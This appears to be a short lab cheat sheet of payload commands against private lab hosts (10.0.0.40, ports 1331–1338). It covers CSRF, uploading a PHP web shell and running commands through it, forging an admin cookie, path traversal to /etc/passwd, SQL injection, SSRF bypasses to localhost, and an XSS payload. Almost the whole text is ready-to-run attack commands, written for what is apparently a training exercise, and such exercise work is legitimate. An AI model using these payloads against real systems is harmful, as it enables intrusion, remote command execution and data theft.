# Lab 2 Payload Commands

## 1. CSRF

Open `lab2/payloads/csrf-change-email.html` in a browser where the victim is authenticated on `http://10.0.0.40:1331`.

## 2. File Upload

```bash
curl -i -F "file=@lab2/payloads/upload-shell.php3;filename=shell.php3" http://10.0.0.40:1332/
curl -i "http://10.0.0.40:1332/uploads/shell.php3?cmd=id"
```

## 3. IDOR Client-Side Role

```bash
curl -i -b 'userdata=eyJyb2xlIjoiYWRtaW4ifQ==' http://10.0.0.40:1333/
```

## 4. Invalid If Statement

```bash
curl -i 'http://10.0.0.40:1334/?sess=anything&user=tom&id=1337'
curl -i 'http://10.0.0.40:1334/?sess=anything&user=tom&id=4242'
```

## 5. Path Traversal

```bash
curl -i 'http://10.0.0.40:1335/?file=/etc/passwd'
```

## 6. Blind SQL Injection

```bash
curl -i -G http://10.0.0.40:1336/ \
  --data-urlencode 'id=0' \
  --data-urlencode 'stock=0' \
  --data-urlencode "color=' OR 1=1 -- -"

python3 lab2/payloads/sqli_blind_redacted.py
```

## 7. SSRF Regex Bypass

```bash
curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://127.1:80/'

curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://2130706433/'
```

## 8. XSS Type Confusion

```bash
curl -i -X POST http://10.0.0.40:1338/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'childName=Alice' \
  --data-urlencode 'letterContent[]=<img src=x onerror=alert(document.domain)>'
```
